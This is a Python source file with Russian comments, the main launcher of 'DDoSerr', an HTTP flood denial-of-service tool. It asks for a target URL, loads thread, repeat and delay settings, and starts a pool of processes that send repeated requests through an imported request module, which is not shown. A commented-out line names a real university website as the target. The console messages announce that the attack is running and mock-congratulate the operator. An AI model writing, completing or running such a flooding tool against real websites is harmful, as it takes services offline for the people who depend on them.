#!/usr/bin/python3
#Путь к интерпретатору пайтона.
# -*- coding: utf-8 -*-
#Выбор кодировки (без него не работает русский язык).

"""
Программа DDoSerr. Основной исполняемый файл.
v.1.5.4.2b. от 12.07.2018.

Считывает и, при необходимости, переопределяет настройки,
запускает модуль HTTP-запросов и логгирует ответы.
"""

"""
Легенда обозначений:
"___" - переделать / удалить;
"---" - отладка;
"~~~" - сделать;
"!" - первоочередная задача.
"""

#Подключаем парсер конфига.
import configparser
#Подключаем свой модуль запросов.
import http_requests
#Подключаем модуль системных команд.
import sys
#Подключаем модуль взаимодействия с системой.
import os
#Подключаем модуль многопроцессорности и многопоточности, а точнее,
#класс Pool.
from multiprocessing import Pool
#Подключаем готовый модуль логгирования.
import logging

#Настройка логгирования.
logging.basicConfig(filename='log.log',level=logging.INFO, \
format='%(asctime)s %(message)s', datefmt='%d.%m.%Y - %I:%M:%S |')

#Перенос кода через '\'.

class Config:
    """
    Класс для работы с конфигрурационными файлами и 
    настройками программы.
    """
    def __init__(self, argv=[], configfile="config.ini"):
        """
        Функция, использующая по умолчанию файл конфигурации
        с именем 'config.ini', в которой можно 
        переопределять настройки из командной строки и
        имя файла конфигурации.
        """
        self.read_config(configfile)
        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        if argv:
            #Обработка параметров командной строки и 
            #переопределение настроек. Надо сделать.
            
            pass    #Затычка, ничего не делает.
        #!~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    def read_config(self, configfile):
        """
        Функция загрузки настроек из файла конфигурации.
        Механизм чтения конфига, поиска нужных значений 
        и присваивания значений пременным. 
        """
        config = configparser.ConfigParser()
        #Считываем настройки из файла конфигурации.
        config.read(configfile)
        #Читаем значения из конфига.
        #Сразу приводим их в правильный тип.
        self.proc_num = int(config.get("Settings", "ProcNum"))
        self.pause = float(config.get("Settings", "Pause"))
        self.repeat = int(config.get("Settings", "Repeat"))
          
          
    """"
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Надо сделать дополнительную функцию под ключи командной строки!
    Если заданы, то переопределяют настройки, если не заданы, 
    то по конфигу.
    interact_input оставить.
    !~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    
    def interact_input(self):
        """
        Ввод одноразовых настроек из консоли с переопределением переменных.
        Сделать вызов этой функции ключом '-i'.
        """
        #Запрос на переопределение настроек и ввод с клавиатуры.
        switch = input("Хотите ли Вы однократно переопределить заданные в конфиг-файле настройки программы?"+\
            '\n'+"Да - 'y', Нет - 'n'."+'\n'+\
            "Ваш выбор: ")
        if switch == "y":
            print("Введите свои параметры.")
            #Переопределение настроек.
            proc_num = int(input("Введите количество создаваемых потоков: "))
            pause = float(input("Введите длительность паузы между заданиями для одного процесса (секунд): "))
            repeat = int(input("Введите количество повторов запросов: "))  
            
            self.proc_num = proc_num
            self.pause = pause
            self.repeat = repeat
            
        elif switch == "n":
            print("Используются настройки из файла конфигурации.")
            
    
    
    def parse_params(self, args):
        """
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        Функция для переопределения настроек
        параметрами командной строки.
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        """
        pass



if __name__ == "__main__":
    """
    Запуск функции main только при запуске этого модуля, 
    но не при импорте.
    Если функция main не задана в явном виде (def main()),
    то весь код (после конструкции if __name__ == "__main__") 
    считается ею.
    """
    
    #Ввод URL атакуемого ресурса. Пока в интерактивном режиме.
    url = str(input("Введите полный адрес цели (с http(s)://): "))
    #url = "https://www.edu.vsu.ru"
    
    #Загрузка настроек из фала конфигурации с сохранением в переменную.
    #Если есть параметры командной строки, то они переопределяют
    #настройки из конфига.
    cfg = Config(sys.argv)
    
    #Вызов функции интерактивного ввода.
    #Позже должна вызываться только по ключу командной строки.
    cfg.interact_input()
    
    
    #Объявляем переменные в этом блоке.
    #Количество процессов.
    proc = cfg.proc_num
    #Количество повторов задания.
    repeat = cfg.repeat
    #Задержка повтора задания.
    pause = cfg.pause
    
    
    """
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    #Сделать настройку url (из командной строки).
    #(Добавить в принимаемые аргументы.)
    #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    """
    
    """
    Реализация многопоточности.
    Получается n процессов: один родительский и n-1 дочерних.
    """
    
    #Вывод информационных сообщений.
    print("DDoSerr запущен." + '\n' + "Атакуемый ресурс: " + url + 
    '\n' + "Запущено процессов: " + str(proc) + '\n' +
    "Дано " + str(repeat) + " заданий с задержкой повторения в " + 
    str(pause) + " секунд(ы)." + '\n' +
    "Атака выполняется." + '\n' + 
    "Пожалуйста, подождите и насладитесь своим величием. :)")
    #Запись информационных сообщений в лог.
    logging.info("DDoSerr запущен." + '\n' + 
    "Атакуемый ресурс: " + url + '\n' +
    "Запущено процессов: " + str(proc) + '\n' + "Дано " + str(repeat) + 
    " заданий с задержкой повторения в " + str(pause) + 
    " секунд(ы)." + '\n' +
    "Атака выполняется." + '\n' + 
    "Пожалуйста, подождите и насладитесь своим величием. :)")
    

    #Создаём пул из 'proc' штук работников (процессов).
    with Pool(processes=proc) as pool:

    #Даём им задание ПО ОДНОМУ через apply_async в цикле
    #и получаем результат.
    
    #Создаётся 'proc' штук процессов с заданием ('пачка').
        for _ in range(proc):
            result = pool.apply_async(http_requests.http_connection, (repeat, pause, url,))
            
            #Логгируем запуск процесса с его PID.
            logging.info('Process ' + str(os.getpid()) + ' was started.')
            
            #Процессы запускаются только при запросе результата от пула
            #методом get().
            
            #Можно использовать в цикле, тогда будет видно разделение
            #на 'пачки' по количеству процессов и 
            #число запросов по количеству повторов.
        
        #Эта функция не возвращает ничего (точнее, возвращает None), 
        #поэтому просто вызывается.
        result.get()
        #Без таймаута (timeout=1), т.к. это ограничивает 
        #время работы программы.
